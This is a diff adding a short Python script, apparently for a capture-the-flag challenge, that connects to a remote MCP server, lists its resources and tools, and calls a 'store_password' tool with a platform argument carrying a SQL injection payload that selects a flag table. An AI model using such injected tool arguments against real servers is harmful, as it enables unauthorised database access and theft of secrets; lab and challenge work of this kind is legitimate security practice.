@@ -1,0 +1,41 @@
+import asyncio
+from fastmcp import Client, FastMCP
+
+client = Client("http://83.136.249.223:43884/mcp/")
+
+async def main():
+    async with client:
+        resources = await client.list_resources()
+        resource_templates = await client.list_resource_templates()
+        tools = await client.list_tools()
+
+        print("Resources:")
+        for resource in resources:
+            print('***')
+            print(resource.name)
+            print(resource.description.strip())
+            
+
+        print("-"*50)
+        print("Resource Templates:")
+        for resource_template in resource_templates:
+            print('***')
+            print(resource_template.uriTemplate)
+            print(resource_template.description.strip())
+            
+
+        print("-"*50)
+        print("Tools:")
+        for tool in tools:
+            print('***')
+            params = list(tool.inputSchema.get('properties').keys())
+            print(f"{tool.name}({','.join(params)})")
+            print(tool.description.strip())
+
+        try:
+            result_object = await client.call_tool("store_password", {"password": "DummyPassword123", "platform": "roottlocker.htb' UNION SELECT flag FROM flag-- -"})
+            print(result_object.content[0].text)
+        except Exception as e:
+            print(f"[-] {e}")
+
+asyncio.run(main())
